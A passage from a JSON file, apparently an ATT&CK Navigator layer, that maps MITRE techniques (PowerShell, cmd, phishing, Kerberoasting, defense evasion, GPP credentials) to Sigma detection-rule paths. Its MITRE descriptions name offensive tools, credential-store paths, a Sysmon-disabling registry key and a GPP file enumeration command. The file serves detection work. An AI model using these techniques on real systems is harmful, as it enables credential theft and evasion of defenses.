                    "value": "sigma\\rules-threat-hunting\\windows\\pipe_created\\pipe_created_sysinternals_psexec_default_pipe.yml"
                }
            ]
        },
        {
            "techniqueID": "T1569",
            "score": 3,
            "comment": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",
            "metadata": [
                {
                    "name": "win_exploit_cve_2021_1675_printspooler.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-1675\\win_exploit_cve_2021_1675_printspooler.yml"
                },
                {
                    "name": "win_exploit_cve_2021_1675_printspooler_operational.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-1675\\win_exploit_cve_2021_1675_printspooler_operational.yml"
                },
                {
                    "name": "win_security_exploit_cve_2021_1675_printspooler_security.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-1675\\win_security_exploit_cve_2021_1675_printspooler_security.yml"
                }
            ]
        },
        {
            "techniqueID": "T1059.005",
            "score": 4,
            "comment": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_adwind.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\Adwind-RAT\\proc_creation_win_malware_adwind.yml"
                },
                {
                    "name": "proc_creation_win_apt_apt10_cloud_hopper.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\APT10\\proc_creation_win_apt_apt10_cloud_hopper.yml"
                },
                {
                    "name": "proc_creation_win_malware_qbot.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\QBot\\proc_creation_win_malware_qbot.yml"
                },
                {
                    "name": "proc_creation_win_wscript_cscript_script_exec.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_wscript_cscript_script_exec.yml"
                }
            ]
        },
        {
            "techniqueID": "T1059.003",
            "score": 8,
            "comment": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_zxshell.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Axiom\\proc_creation_win_apt_zxshell.yml"
                },
                {
                    "name": "proc_creation_win_malware_elise.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\Malware\\Elise-Backdoor\\proc_creation_win_malware_elise.yml"
                },
                {
                    "name": "proc_creation_win_apt_sofacy.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\APT28\\proc_creation_win_apt_sofacy.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2019_1378.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-1378\\proc_creation_win_exploit_cve_2019_1378.yml"
                },
                {
                    "name": "proc_creation_win_malware_babyshark.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\BabyShark\\proc_creation_win_malware_babyshark.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2020_10189.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-10189\\proc_creation_win_exploit_cve_2020_10189.yml"
                },
                {
                    "name": "proc_creation_win_malware_pikabot_combined_commands_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_combined_commands_execution.yml"
                },
                {
                    "name": "proc_creation_win_malware_rorschach_ransomware_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Rorschach\\proc_creation_win_malware_rorschach_ransomware_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1059.001",
            "score": 27,
            "comment": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_comrat_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_comrat_may20.yml"
                },
                {
                    "name": "proc_creation_win_apt_tropictrooper.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\TropicTrooper\\proc_creation_win_apt_tropictrooper.yml"
                },
                {
                    "name": "proc_creation_win_malware_babyshark.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\BabyShark\\proc_creation_win_malware_babyshark.yml"
                },
                {
                    "name": "proc_creation_win_malware_emotet.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Emotet\\proc_creation_win_malware_emotet.yml"
                },
                {
                    "name": "proc_creation_win_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\proc_creation_win_apt_wocao.yml"
                },
                {
                    "name": "win_security_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\win_security_apt_wocao.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2020_10189.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-10189\\proc_creation_win_exploit_cve_2020_10189.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2020_1048.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-1048\\proc_creation_win_exploit_cve_2020_1048.yml"
                },
                {
                    "name": "proc_creation_win_apt_greenbug_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Greenbug\\proc_creation_win_apt_greenbug_may20.yml"
                },
                {
                    "name": "proc_creation_win_apt_unc2452_cmds.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\SolarWinds-Supply-Chain\\proc_creation_win_apt_unc2452_cmds.yml"
                },
                {
                    "name": "proc_creation_win_apt_unc2452_ps.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\SolarWinds-Supply-Chain\\proc_creation_win_apt_unc2452_ps.yml"
                },
                {
                    "name": "proc_creation_win_malware_blackbyte_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\BlackByte\\proc_creation_win_malware_blackbyte_ransomware.yml"
                },
                {
                    "name": "file_event_win_cve_2022_24527_lpe.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-24527\\file_event_win_cve_2022_24527_lpe.yml"
                },
                {
                    "name": "create_remote_thread_win_malware_bumblebee.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Malware\\Bumblebee\\create_remote_thread_win_malware_bumblebee.yml"
                },
                {
                    "name": "proc_creation_win_apt_mercury.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\TA\\MERCURY\\proc_creation_win_apt_mercury.yml"
                },
                {
                    "name": "proc_creation_win_malware_rorschach_ransomware_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Rorschach\\proc_creation_win_malware_rorschach_ransomware_activity.yml"
                },
                {
                    "name": "posh_ps_apt_fin7_powerhold.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\FIN7\\posh_ps_apt_fin7_powerhold.yml"
                },
                {
                    "name": "posh_ps_apt_fin7_powertrash_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\FIN7\\posh_ps_apt_fin7_powertrash_execution.yml"
                },
                {
                    "name": "posh_ps_apt_lace_tempest_eraser_script.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Lace-Tempest\\posh_ps_apt_lace_tempest_eraser_script.yml"
                },
                {
                    "name": "posh_ps_apt_lace_tempest_malware_launcher.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Lace-Tempest\\posh_ps_apt_lace_tempest_malware_launcher.yml"
                },
                {
                    "name": "create_remote_thread_win_powershell_generic.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\create_remote_thread\\create_remote_thread_win_powershell_generic.yml"
                },
                {
                    "name": "posh_pc_alternate_powershell_hosts.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_classic\\posh_pc_alternate_powershell_hosts.yml"
                },
                {
                    "name": "posh_ps_win_api_functions_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_win_api_functions_access.yml"
                },
                {
                    "name": "posh_ps_win_api_library_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_win_api_library_access.yml"
                },
                {
                    "name": "proc_creation_win_powershell_abnormal_commandline_size.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_powershell_abnormal_commandline_size.yml"
                },
                {
                    "name": "proc_creation_win_powershell_crypto_namespace.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_powershell_crypto_namespace.yml"
                },
                {
                    "name": "registry_set_powershell_crypto_namespace.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\registry\\registry_set\\registry_set_powershell_crypto_namespace.yml"
                }
            ]
        },
        {
            "techniqueID": "T1567",
            "score": 1,
            "comment": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
            "metadata": [
                {
                    "name": "proc_creation_win_curl_fileupload.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_curl_fileupload.yml"
                }
            ]
        },
        {
            "techniqueID": "T1566.001",
            "score": 3,
            "comment": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2017_0261.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-0261\\proc_creation_win_exploit_cve_2017_0261.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_11882.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-11882\\proc_creation_win_exploit_cve_2017_11882.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_8759.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-8759\\proc_creation_win_exploit_cve_2017_8759.yml"
                }
            ]
        },
        {
            "techniqueID": "T1566",
            "score": 3,
            "comment": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
            "metadata": [
                {
                    "name": "file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml"
                },
                {
                    "name": "registry_set_cve_2021_31979_cve_2021_33771_exploits.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\registry_set_cve_2021_31979_cve_2021_33771_exploits.yml"
                },
                {
                    "name": "file_event_win_webdav_tmpfile_creation.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_event\\file_event_win_webdav_tmpfile_creation.yml"
                }
            ]
        },
        {
            "techniqueID": "T1518.001",
            "score": 1,
            "comment": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)",
            "metadata": [
                {
                    "name": "posh_pm_susp_netfirewallrule_recon.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_module\\posh_pm_susp_netfirewallrule_recon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1562.004",
            "score": 1,
            "comment": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)",
            "metadata": [
                {
                    "name": "win_firewall_as_change_rule.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\builtin\\firewall_as\\win_firewall_as_change_rule.yml"
                }
            ]
        },
        {
            "techniqueID": "T1562.001",
            "score": 1,
            "comment": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_ke3chang_tidepool.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Ke3chang-TidePool\\proc_creation_win_malware_ke3chang_tidepool.yml"
                }
            ]
        },
        {
            "techniqueID": "T1562",
            "score": 1,
            "comment": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Emotet shutdown)\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
            "metadata": [
                {
                    "name": "registry_event_apt_diamond_sleet_scheduled_task.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Diamond-Sleet\\registry_event_apt_diamond_sleet_scheduled_task.yml"
                }
            ]
        },
        {
            "techniqueID": "T1560.001",
            "score": 2,
            "comment": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_apt31_judgement_panda.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\APT31\\proc_creation_win_apt_apt31_judgement_panda.yml"
                },
                {
                    "name": "proc_creation_win_susp_compression_params.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_compression_params.yml"
                }
            ]
        },
        {
            "techniqueID": "T1560",
            "score": 2,
            "comment": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_conti_7zip.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Conti\\proc_creation_win_malware_conti_7zip.yml"
                },
                {
                    "name": "posh_ps_compress_archive_usage.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_compress_archive_usage.yml"
                }
            ]
        },
        {
            "techniqueID": "T1559",
            "score": 1,
            "comment": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_trickbot_wermgr.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Trickbot\\proc_creation_win_malware_trickbot_wermgr.yml"
                }
            ]
        },
        {
            "techniqueID": "T1558",
            "score": 1,
            "comment": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
            "metadata": [
                {
                    "name": "win_security_admin_logon.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_admin_logon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1558.003",
            "score": 1,
            "comment": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
            "metadata": [
                {
                    "name": "win_system_exploit_cve_2021_42278.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-42278\\win_system_exploit_cve_2021_42278.yml"
                }
            ]
        },
        {
            "techniqueID": "T1552.006",
            "score": 1,
            "comment": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n",
            "metadata": [
                {
